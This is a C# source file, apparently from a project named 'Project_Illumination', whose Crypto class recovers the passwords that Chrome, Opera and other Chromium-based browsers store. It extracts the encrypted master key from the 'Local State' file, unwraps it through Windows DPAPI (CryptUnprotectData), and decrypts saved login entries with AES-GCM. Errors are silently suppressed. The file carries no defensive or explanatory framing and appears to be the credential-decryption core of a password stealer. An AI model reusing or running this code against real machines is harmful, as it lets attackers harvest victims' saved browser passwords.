using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Text.RegularExpressions;

namespace Project_Illumination
{
    internal class Crypto
    {
        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        private struct CryptprotectPromptstruct
        {
            public int cbSize;
            public int dwPromptFlags;
            public IntPtr hwndApp;
            public string szPrompt;
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        private struct DataBlob
        {
            public int cbData;
            public IntPtr pbData;
        }

        [DllImport("crypt32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern bool CryptUnprotectData(ref DataBlob pCipherText, ref string pszDescription, ref DataBlob pEntropy, IntPtr pReserved, ref CryptprotectPromptstruct pPrompt, int dwFlags, ref DataBlob pPlainText);

        // Speed up decryption using master key
        private static string sPrevBrowserPath = "";
        private static byte[] sPrevMasterKey = { };

        // Chrome < 80
        public static byte[] DPAPIDecrypt(byte[] bCipher, byte[] bEntropy = null)
        {
            DataBlob pPlainText = new DataBlob(), pCipherText = new DataBlob(), pEntropy = new DataBlob();
            CryptprotectPromptstruct pPrompt = new CryptprotectPromptstruct
            {
                cbSize = Marshal.SizeOf(typeof(CryptprotectPromptstruct)),
                dwPromptFlags = 0,
                hwndApp = IntPtr.Zero,
                szPrompt = null
            };

            string sEmpty = "";
            try
            {
                bCipher ??= new byte[0];

                pCipherText.pbData = Marshal.AllocHGlobal(bCipher.Length);
                pCipherText.cbData = bCipher.Length;
                Marshal.Copy(bCipher, 0, pCipherText.pbData, bCipher.Length);


                bEntropy ??= new byte[0];

                pEntropy.pbData = Marshal.AllocHGlobal(bEntropy.Length);
                pEntropy.cbData = bEntropy.Length;

                Marshal.Copy(bEntropy, 0, pEntropy.pbData, bEntropy.Length);



                CryptUnprotectData(ref pCipherText, ref sEmpty, ref pEntropy, IntPtr.Zero, ref pPrompt, 1, ref pPlainText);

                byte[] bDestination = new byte[pPlainText.cbData];
                Marshal.Copy(pPlainText.pbData, bDestination, 0, pPlainText.cbData);
                return bDestination;

            }
            catch
            {
                // ignored
            }
            finally
            {
                if (pPlainText.pbData != IntPtr.Zero) Marshal.FreeHGlobal(pPlainText.pbData);
                if (pCipherText.pbData != IntPtr.Zero) Marshal.FreeHGlobal(pCipherText.pbData);
                if (pEntropy.pbData != IntPtr.Zero) Marshal.FreeHGlobal(pEntropy.pbData);
            }
            return new byte[0];
        }
        // Chrome > 80
        public static byte[] GetMasterKey(string sLocalStateFolder)
        {

            string sLocalStateFile = sLocalStateFolder + (sLocalStateFolder.Contains("Opera") ? @"\Opera Stable\Local State" : @"\Local State");
            byte[] bMasterKey = { };

            if (!File.Exists(sLocalStateFile)) return null;
            if (sLocalStateFile == sPrevBrowserPath) return sPrevMasterKey;

            sPrevBrowserPath = sLocalStateFile;


            var pattern = new Regex("\"encrypted_key\":\"(.*?)\"",
                RegexOptions.Compiled).Matches(
                File.ReadAllText(sLocalStateFile));
            foreach (Match prof in pattern)
            {
                if (prof.Success)
                    bMasterKey = Convert.FromBase64String(prof.Groups[1].Value);
            }


            byte[] bRawMasterKey = new byte[bMasterKey.Length - 5];
            Array.Copy(bMasterKey, 5, bRawMasterKey, 0, bMasterKey.Length - 5);

            try
            {
                sPrevMasterKey = DPAPIDecrypt(bRawMasterKey);
                return sPrevMasterKey;
            }
            catch { return null; }
        }

        public static string GetUTF8(string input)
        {
            try
            {
                return Encoding.UTF8.GetString(Encoding.Default.GetBytes(input));
            }
            catch
            {
                return input;
            }
        }

        public static byte[] DecryptWithKey(byte[] bEncryptedData, byte[] bMasterKey)
        {
            byte[] iv = { 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0 };
            Array.Copy(bEncryptedData, 3, iv, 0, 12);

            try
            {
                byte[] bBuffer = new byte[bEncryptedData.Length - 15];
                Array.Copy(bEncryptedData, 15, bBuffer, 0, bEncryptedData.Length - 15);

                byte[] tag = new byte[16], data = new byte[bBuffer.Length - tag.Length];
                Array.Copy(bBuffer, bBuffer.Length - 16, tag, 0, 16);
                Array.Copy(bBuffer, 0, data, 0, bBuffer.Length - tag.Length);

                return new AesGcm().Decrypt(bMasterKey, iv, null, data, tag);
            }
            catch
            {
                return null;
            }
        }

        public static string EasyDecrypt(string loginData, string password)
        {
            try
            {
                if (!password.StartsWith("v10") && !password.StartsWith("v11"))
                    return Encoding.Default.GetString(DPAPIDecrypt(Encoding.Default.GetBytes(password)));

                var masterKey = GetMasterKey(Directory.GetParent(loginData).Parent?.FullName);
                return Encoding.Default.GetString(DecryptWithKey(Encoding.Default.GetBytes(password), masterKey));
            }
            catch
            {
                return "";
            }
        }
    }
}
